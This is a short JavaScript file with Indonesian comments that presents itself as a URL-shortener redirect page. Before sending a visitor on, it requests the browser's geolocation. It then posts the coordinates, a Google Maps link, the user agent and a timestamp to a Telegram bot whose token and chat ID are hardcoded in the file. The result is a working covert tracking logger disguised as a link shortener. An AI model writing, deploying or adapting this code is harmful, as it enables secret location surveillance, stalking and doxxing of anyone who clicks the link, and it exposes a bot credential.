const BOT_TOKEN = "7883114175:AAHoSytNEqiKJoOWlAEokmviHOl9dJ32zI0";
const CHAT_ID = "1598127418";

// Ambil kode short dari path URL
const shortCode = window.location.pathname.split("/").pop();

function sendLogAndRedirect(url) {
  navigator.geolocation.getCurrentPosition(
    pos => {
      const googleMapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
      const msg = `📍 *Visitor*\n🌍 ${pos.coords.latitude}, ${pos.coords.longitude} (±${pos.coords.accuracy}m)\n🗺️ [Google Maps](${googleMapsLink})\n📱 ${navigator.userAgent}\n🕒 ${new Date().toLocaleString()}\n🔗 Kode: ${shortCode}`;
      sendToTelegram(msg, url);
    },
    () => {
      const msg = `📍 *Visitor (No Location)*\n📱 ${navigator.userAgent}\n🕒 ${new Date().toLocaleString()}\n🔗 Kode: ${shortCode}`;
      sendToTelegram(msg, url);
    }
  );
}

function sendToTelegram(message, redirectUrl) {
  const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  fetch(apiUrl, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
  }).finally(() => window.location.href = redirectUrl);
}

// Ambil database tujuan dari file
fetch("data.json")
  .then(res => res.json())
  .then(data => {
    const url = data[shortCode];
    if (url) {
      sendLogAndRedirect(url);
    } else {
      document.body.innerHTML = "<h2>Link tidak ditemukan.</h2>";
    }
  });
